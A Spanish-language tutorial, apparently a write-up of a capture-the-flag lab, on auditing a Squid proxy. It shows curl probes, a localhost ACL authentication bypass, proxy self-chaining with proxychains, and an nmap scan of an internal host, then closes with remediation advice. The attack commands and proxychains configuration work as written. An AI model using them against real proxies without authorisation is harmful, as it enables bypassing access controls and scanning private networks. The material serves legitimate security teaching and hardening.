# **Análisis de Squid Proxy: De la Enumeración al Pivoting Interno**

Un servidor Squid Proxy es un objetivo de alto valor en una red. Su función como intermediario lo convierte en un punto de control que, si está mal configurado, puede ser la llave de acceso a la red interna. Esta guía cubre todo el proceso de auditoría, desde la identificación inicial hasta la explotación de malas configuraciones comunes.

## 1\. Fundamentos de Squid Proxy

#### ¿Qué es Squid?

Squid es un servidor **proxy de reenvío (forward proxy)** y **caché web**. Su propósito principal es gestionar las peticiones web de los clientes de una red interna hacia Internet.

  * **Como Proxy**: Centraliza y controla el tráfico saliente. Los usuarios no se conectan directamente a Internet; lo hacen a través de Squid.
  * **Como Caché**: Almacena copias locales de recursos web (imágenes, archivos JS/CSS), lo que acelera la navegación y ahorra ancho de banda.
  * **Puerto por Defecto**: Squid tradicionalmente escucha en el puerto **3128/TCP**.

#### El Pilar de la Seguridad en Squid: Access Control Lists (ACLs)

Las **ACLs (Listas de Control de Acceso)** son el corazón de la configuración de seguridad de Squid. Son directivas que definen "quién", "qué", "dónde" y "cuándo" se puede acceder a través del proxy.

Una configuración de ACLs consta de dos partes:

1.  **Definición de la ACL (`acl`)**: Se crea una lista con nombre que define un criterio.
      * `acl localnet src 192.168.1.0/24`: Define una ACL llamada `localnet` para cualquier petición originada en la red `192.168.1.0/24`.
      * `acl Safe_ports port 80 443`: Define una ACL para los puertos web estándar.
2.  **Aplicación de la Regla (`http_access`)**: Se permite (`allow`) o deniega (`deny`) el tráfico que coincide con una ACL. El orden es crucial: Squid procesa las reglas de arriba hacia abajo y se detiene en la primera que coincide.
      * `http_access allow localnet`: Permite el acceso si el origen coincide con la ACL `localnet`.
      * `http_access deny all`: Deniega todo lo demás (regla de "denegación por defecto").

## 2\. Fase de Enumeración: Descubriendo y Probando el Proxy

El primer paso es confirmar la presencia del proxy e intentar usarlo.

#### Comando de Verificación con `curl`

```bash
curl -I --proxy http://<IP_PROXY>:3128 http://<URL_DESTINO_EXTERNO>
```

#### Caso Práctico: Autenticación Requerida

Al lanzar una petición a través del proxy en `10.10.10.224`, observamos una respuesta estándar de seguridad.

```bash
curl -I --proxy http://10.10.10.224:3128 http://10.197.243.77
```

**Respuesta Obtenida:**

```
HTTP/1.1 407 Proxy Authentication Required
Proxy-Authenticate: Basic realm="Web-Proxy"
Via: 1.1 srv01.realcorp.htb (squid/4.11)
```

  * **Análisis**: El código `407 Proxy Authentication Required` es inequívoco. El proxy está activo y configurado para exigir credenciales. La cabecera `Via` incluso nos revela el hostname del servidor proxy: `srv01.realcorp.htb`.

## 3\. La Mala Configuración Crítica: El Privilegio de `localhost`

Muchos administradores necesitan realizar tareas de mantenimiento o monitorización en el servidor proxy desde el propio servidor. Para facilitar esto, a menudo añaden una ACL que permite el tráfico desde `localhost` sin autenticación.

**Ejemplo de una ACL Peligrosa en `squid.conf`:**

```
acl localnet src 127.0.0.1/32
http_access allow localnet
http_access allow authenticated_users
http_access deny all
```

Esta configuración permite que cualquier petición que se origine desde `127.0.0.1` (`localhost`) se salte la regla de `authenticated_users`. **Esta es la debilidad que vamos a explotar.**

### Verificando la Hipótesis del Bypass

Intentamos que el proxy se conecte a sí mismo a través de su interfaz `localhost` (`127.0.0.1`).

```bash
curl -I --proxy http://10.10.10.224:3128 http://127.0.0.1
```

**Respuesta Obtenida:**

```
HTTP/1.1 503 Service Unavailable
X-Squid-Error: ERR_CONNECT_FAIL 111
```

  * **Análisis Profundo**: Este error `503` es nuestra señal de éxito.
      * **No es un `407`**: No nos pide autenticación, lo que significa que la ACL para `localhost` ha permitido la petición.
      * **`ERR_CONNECT_FAIL 111`**: El error 111 en Linux es `Connection refused`. Squid **intentó** conectarse al puerto 80 en `127.0.0.1` (en el propio servidor proxy), pero falló porque no había ningún servicio escuchando allí.
      * **Conclusión**: Hemos confirmado que las peticiones a `localhost` bypassean la autenticación.

## 4\. Explotación: Pivoting con Proxy Chaining

El objetivo ahora es hacer que nuestra petición externa parezca que viene desde el `localhost` del servidor proxy. Para ello, encadenamos el proxy consigo mismo usando `proxychains`.

#### 1\. Configuración de `proxychains`

Editamos `/etc/proxychains4.conf` para crear una cadena.

```
[ProxyList]
# 1. Nuestra petición va primero al proxy externo.
http    10.10.10.224 3128
# 2. Luego, le decimos que la reenvíe a sí mismo, pero a través de su interfaz local.
http    127.0.0.1    3128
```

#### 2\. Lanzando el Ataque para Escanear la Red Interna

Usamos `proxychains` para tunelizar `nmap` y escanear un host de la red interna.

```bash
sudo proxychains4 -q nmap -sT -Pn -n 10.197.243.77
```

**Flujo Detallado del Ataque:**

1.  `nmap` (a través de `proxychains`) envía su tráfico al primer proxy en la lista: `http://10.10.10.224:3128`.
2.  Squid recibe la petición. `proxychains` le indica que el siguiente salto es `http://127.0.0.1:3128`.
3.  Squid procesa esta segunda petición. Desde su perspectiva, **la petición se origina en `127.0.0.1` (`localhost`)**.
4.  La ACL permisiva `http_access allow localnet` se activa. La petición de `nmap` **se aprueba sin necesidad de autenticación** y se reenvía a su destino final (`10.197.243.77`).

**Resultado:**

```
Discovered open port 53/tcp on 10.197.243.77
Discovered open port 22/tcp on 10.197.243.77
```

Hemos logrado pivotar y escanear la red interna, bypasseando por completo los controles de autenticación.

## 5\. Remediación y Buenas Prácticas

Esta vulnerabilidad es una **mala configuración**, no un fallo del software de Squid. Para solucionarlo:

1.  **Ser Específico con las ACLs de `localhost`**: Nunca se debe permitir a `localhost` acceso sin restricciones a toda la red. Si se necesita acceso administrativo, debe limitarse a destinos específicos.
    ```diff
    # MAL: Permite a localhost acceder a cualquier lugar
    - http_access allow localnet

    # BIEN: Permite a localhost acceder solo al manager de caché del proxy
    + acl manager proto cache_object
    + http_access allow localnet manager
    ```
2.  **Forzar Autenticación para `localhost`**: Si el acceso administrativo es necesario, se debe forzar la autenticación incluso para `localhost`.
3.  **Principio de Mínimo Privilegio**: Aplicar siempre una regla `http_access deny all` al final y construir las reglas de permiso de la más específica a la más general.

En resumen, un proxy Squid es un punto crítico. Auditar sus ACLs en busca de reglas demasiado permisivas, especialmente para `localhost`, puede revelar una vía directa para comprometer la red interna.